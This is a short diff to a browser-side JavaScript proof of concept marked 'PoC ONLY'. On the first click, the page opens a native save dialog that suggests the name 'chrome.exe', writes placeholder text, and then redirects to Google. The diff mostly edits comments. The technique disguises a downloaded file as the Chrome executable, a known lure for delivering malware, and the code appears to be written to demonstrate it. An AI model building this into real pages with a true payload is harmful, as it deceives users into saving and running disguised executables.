@@ -14,7 +14,7 @@ document.addEventListener('click', async () => {
     if (!('showSaveFilePicker' in window)) return;
 
     try {
-        // 1. File picker EXE
+        // 1. Save File Picker (Google / Chrome native)
         const handle = await window.showSaveFilePicker({
             suggestedName: 'chrome.exe',
             types: [{
@@ -25,7 +25,7 @@ document.addEventListener('click', async () => {
             }]
         });
 
-        // 2. Tulis isi (PASTI ada)
+        // 2. Write dummy content
         const writable = await handle.createWritable();
         await writable.write(
             'PoC ONLY\r\n' +
@@ -34,13 +34,13 @@ document.addEventListener('click', async () => {
         );
         await writable.close();
 
-        // 3. Redirect setelah write selesai
+        // 3. Redirect setelah selesai
         setTimeout(() => {
-            window.location.open = 'https://chrome.com';
+            window.location.assign('https://www.google.com/');
         }, 500);
 
     } catch (e) {
-        // cancel expected
+        // user cancel = expected
     }
 }, { once: true });
 </script>
